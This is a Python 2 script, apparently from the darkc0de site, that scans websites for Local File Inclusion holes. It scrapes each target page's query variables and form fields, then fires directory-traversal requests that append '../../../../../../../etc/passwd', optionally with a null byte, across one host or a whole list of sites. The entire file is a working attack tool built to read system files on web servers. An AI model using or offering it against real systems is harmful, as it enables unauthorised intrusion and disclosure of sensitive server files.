#!/usr/bin/python
#This is a Local File Inclusion scanner.
#
##http://www.darkc0de.com
##d3hydr8[at]gmail[dot]com

import sys, httplib, time, socket, sets, urllib2, re

def main(host):
	
	print "\n","-"*55
	print "\n[+] Target host:",host

	#Getting http request codes

	okresp = tester("/")[:1]
	badresp,reason,server = tester("/d3hydr8.html")

	host = getindex(okresp[0])

	if okresp[0] == badresp:
		print "\n[-] Responses matched, try another host.\n"
	else:
		print "[+] Target server:",server
		print "[+] Target OK response:",okresp[0]
		print "[+] Target BAD response:",badresp, reason
		print "[+] Scan Started at",timer()
		time.sleep(2)

		print "[+] Gathering Fields:",host
	
		try:
			names, actions, var = getvar()
			print "[+] Variables:",len(var),"| Actions:",len(actions),"| Fields:",len(names)
			print "[+] Avg Requests:",(len(var)+len(names)+(len(actions)*len(names))+(len(actions)*len(names)))
			paths = getpaths(var, names, actions)
			print "[+] Paths Found:",len(paths),"\n"
			for path in paths:
				for x in xrange(path.count("../")-2):
					code, reason = tester(path.replace('../',"",x+1))[:2]	
					if code == okresp[0]:
						print "\n\t[+]",code,reason,":",path.split("/",1)[1].replace('../',"",x+1),"\n"
		except(TypeError):
			print "[-] Couldn't find enough fields.\n"
			pass
		
def tester(path):
	
	try:# make a http HEAD request
		h = httplib.HTTP(host.split("/",1)[0], int(port))
		h.putrequest("GET", "/"+path.split("/",1)[1])
		h.putheader("Host", host.split("/",1)[0])
		h.endheaders()
		status, reason, headers = h.getreply()
		if verbose == 1:
			print "[+]",status,reason,":","/"+path.split("/",1)[1]
		return status, reason, headers.get("Server")
	except(), msg: 
		print "[-] Error Occurred\n",msg
		sys.exit(1)
		
def timer():
	now = time.localtime(time.time())
	return time.asctime(now)

def getindex(okresp):
	#Try and get index page if not posted.
	if re.search("index", host) == None:
		code = tester("/index.php")[:1]
		if code[0] == okresp:
			return host+"/index.php"
		else:
			code = tester("/index.html")[:1]	
			if code[0] == okresp:
				return host+"/index.html"
			
def getpaths(var, names, actions):
	print "[+] Creating Paths...\n"

	if len(var) >= 1:
		for v in var:
			if host.count("/") >= 2:
				for x in xrange(host.count("/")):
					paths.append(host.rsplit('/',x+1)[0]+"/"+v+lfi+null)
			paths.append(host+"/"+v+lfi+null)
		
	if len(names) >= 1:
		for n in names:
			if host.count("/") >= 2:
				for x in xrange(host.count("/")):
					paths.append(host.rsplit('/',x+1)[0]+"/"+"?"+n+"="+lfi+null)
			paths.append(host+"/"+"?"+n+"="+lfi+null)
		
	if len(actions) != 0 and len(names) >= 1:
		for a in actions:
			for n in names:
				if host.count("/") >= 2:
					for x in xrange(host.count("/")):
						paths.append(host.rsplit('/',x+1)[0]+a+"?"+n+"="+lfi+null)
				#paths.append(host.split("/")[0]+a+"?"+n+"="+lfi+null)
			
	if len(actions) != 0 and len(var) >= 1:
		for a in actions:
			for v in var:
				if host.count("/") >= 2:
					for x in xrange(host.count("/")):
						paths.append(host.rsplit('/',x+1)[0]+a+v+lfi+null)
				else:
					paths.append(host.split("/")[0]+a+v+lfi+null)
	return paths

def getvar():
	
	names = []
	actions = []

	try:
		webpage = urllib2.urlopen("http://"+host, port).read()
		var = re.findall("\?[\w\.\-/]*\=",webpage)
		if len(var) >=1:
			var = list(sets.Set(var))
		found_action = re.findall("action=\"[\w\.\-/]*\"", webpage.lower())
		found_action = list(sets.Set(found_action))
		if len(found_action) >= 1:
			for a in found_action:
				a = a.split('"',2)[1]
				try:
					if a[0] != "/":
						a = "/"+a
				except(IndexError):
						pass
				actions.append(a)
		found_names = re.findall("name=\"[\w\.\-/]*\"", webpage.lower())
		found_names = list(sets.Set(found_names))
		for n in found_names:
			names.append(n.split('"',2)[1])
		return names, actions, var
	except(socket.timeout, IOError, ValueError, socket.error, socket.gaierror, httplib.BadStatusLine):
		pass
	except(KeyboardInterrupt):
		print "\n[-] Cancelled -",timer(),"\n"
		sys.exit(1)
		
print "\n\t   d3hydr8[at]gmail[dot]com LFIscanner v1.0"
print "\t----------------------------------------------"
		
if len(sys.argv) < 3 or len(sys.argv) > 7:
	print "\nUsage: ./lfiscan.py <options>\n"
	print "Ex. ./lfiscan.py -h google.com -p 80 -null -v"
	print "Ex. ./lfiscan.py -list sites.txt -p 80 -v\n"
	print "\t[options]"
	print "\t   -h/-host : Host to scan"
	print "\t   -p/-port : Port to use (defaults: 80)"
	print "\t   -l/-list <list of sites> : List of sites to scan through"
	print "\t   -n/-null : Adds a null byte onto the end of the inclusion"
	print "\t   -v/-verbose : Shows every lfi attempt\n"
	sys.exit(1)

paths = []
lfi = "../../../../../../../etc/passwd"
socket.setdefaulttimeout(25)

for arg in sys.argv[1:]:
	if arg.lower() == "-h" or arg.lower() == "-host":
		host = sys.argv[int(sys.argv[1:].index(arg))+2]
	if arg.lower() == "-p" or arg.lower() == "-port":
		port = sys.argv[int(sys.argv[1:].index(arg))+2]
	if arg.lower() == "-l" or arg.lower() == "-list":
		sites = open(sys.argv[int(sys.argv[1:].index(arg))+2], "r").readlines()
	if arg.lower() == "-v" or arg.lower() == "-verbose":
		verbose = 1
	if arg.lower() == "-n" or arg.lower() == "-null":
		null = "%00"
try:
	if verbose ==1:
		print "\n[+] Verbose Mode On"	
except(NameError):
	print "\n[-] Verbose Mode Off"
	verbose = 0
try:
	if null:
		print "[+] Null Byte On"
except(NameError):
	print "[-] Null Byte Off"
	null = ""
try:
	if port:
		print "[+] Target port:",port
except(NameError):
	port = "80"
	print "[+] Target port:",port
try:
	if sites:
		print "\n[+] Loaded:",len(sites),"sites"
		for host in sites:
			host = host[:-1]
			if host[:7] == "http://":
				host = host.replace("http://","")
			if host[-1] == "/":
				host = host[:-1]
			main(host)
except(NameError):
	if host[:7] == "http://":
		host = host.replace("http://","")
	if host[-1] == "/":
		host = host[:-1]
	main(host)		
print "\n[-] Scan completed at",timer(),"\n"


	